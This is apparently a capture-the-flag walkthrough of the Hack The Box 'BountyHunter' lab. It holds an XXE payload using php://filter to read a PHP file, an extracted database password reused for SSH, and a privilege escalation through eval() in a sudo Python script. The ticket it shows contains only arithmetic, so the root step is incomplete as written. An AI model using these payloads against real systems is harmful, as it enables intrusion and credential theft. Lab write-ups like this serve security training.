## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp <IP>
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts <IP>
```

---

## 🕵️ [Web Enumeration](HTTP)
```bash
# Add to /etc/hosts
<IP> bountyhunter.htb

# Fuzz VHosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://bountyhunter.htb -H "Host: FUZZ.bountyhunter.htb" --fs 194
```

### Identified:
- **www.bountyhunter.htb** (Default Page)
- **tracker_diRbPr00f314.php** (Found via Burp/Form Submission)

---

## 📂 XML/XXE Exploitation
### Decode Burp Request:
1. URL-decode `data`
2. Base64-decode result
3. XML structure remains

### Exploit XXE to Read Files
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
<bugreport>
  <title>test</title>
  <cwe>123</cwe>
  <cvss>5</cvss>
  <reward>&xxe;</reward>
</bugreport>
```

### Encode for Delivery:
- Base64 the above
- URL encode the Base64

### Submit via Burp:
```http
POST /tracker_diRbPr00f314.php
...
data=<encoded payload>
```

### Result:
```bash
# Decode base64 response to read db.php
cat result.b64 | base64 -d
```

### Extracted Password:
```bash
# dbpassword: m19RoAU0hP41A1sTsq6K
```

---

## 🔐 [Shell as Development](SSH)
```bash
ssh development@<IP>
# password: m19RoAU0hP41A1sTsq6K
```
```bash
cat ~/user.txt
```

---

## 🖕 Root Escalation
### Check sudo perms:
```bash
sudo -l
```
```bash
# Result:
(root) NOPASSWD: /opt/ticketValidator/ticketValidator.py
```

### Inspect Script:
```python
# dangerous line
validationNumber = eval(x.replace("**", ""))
```

### Bypass Ticket Format:
```bash
# Example ticket:
cat << EOF > /tmp/ticket
== Ticket ==
TicketCode: 18
**101+1
EOF
```

### Run Validator with Ticket:
```bash
sudo /opt/ticketValidator/ticketValidator.py /tmp/ticket
```

### Get Root Flag:
```bash
cat /root/root.txt
```

---

## 📚 Summary
- Web endpoint: `/tracker_diRbPr00f314.php`
- Encodings: URL, Base64
- Data format: XML
- Attack: XXE
- XXE Bypass with: PHP filters (`php://filter/...`)
- Priv Esc: Insecure use of `eval()` in sudo Python script

---

## 📚 Resources
- [SecJuice BountyHunter Walkthrough](https://www.secjuice.com/htb-bountyhunter-walkthrough/)
- [PayloadAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

